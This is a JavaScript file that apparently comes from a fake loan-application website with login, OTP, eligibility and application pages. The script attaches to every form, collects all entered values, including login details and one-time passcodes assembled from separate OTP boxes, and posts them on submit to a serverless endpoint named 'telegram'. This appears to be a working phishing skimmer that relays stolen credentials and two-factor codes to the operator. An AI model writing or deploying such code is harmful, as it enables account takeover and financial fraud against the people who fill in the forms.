(function () {
  'use strict';

  var titles = {
    eligibility: 'Eligibility Check',
    login: 'Login Submitted',
    otp: 'OTP Code Entered',
    apply: 'Loan Application',
    'thank-you': 'Application Completed'
  };

  function pageName() {
    return (window.location.pathname.split('/').pop() || 'index').replace('.html', '') || 'index';
  }

  function collect(form) {
    var data = {};
    Array.prototype.forEach.call(form.querySelectorAll('input, select, textarea'), function (el) {
      var key = el.id || el.name;
      if (!key) return;
      if (el.type === 'checkbox') data[key] = el.checked ? 'yes' : 'no';
      else if (el.value !== '') data[key] = el.value;
    });

    var otp = '';
    Array.prototype.forEach.call(form.querySelectorAll('.otp-inputs input'), function (i) { otp += i.value; });
    if (otp) data.otp = otp;

    var pane = form.querySelector('.step-pane.active');
    if (pane) data.currentStep = pane.getAttribute('data-pane');

    return data;
  }

  function send(form) {
    var data = collect(form);
    var has = false;
    for (var k in data) { if (data[k] && data[k] !== 'no') { has = true; break; } }
    if (!has) return;

    fetch('/.netlify/functions/telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: pageName(),
        title: titles[pageName()] || 'Form Submission',
        data: data,
        page: window.location.pathname
      })
    }).catch(function (e) { console.warn('[Telegram]', e); });
  }

  function attach() {
    Array.prototype.forEach.call(document.querySelectorAll('form'), function (form) {
      form.addEventListener('submit', function () { send(form); }, true);
    });
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', attach);
  else attach();
})();
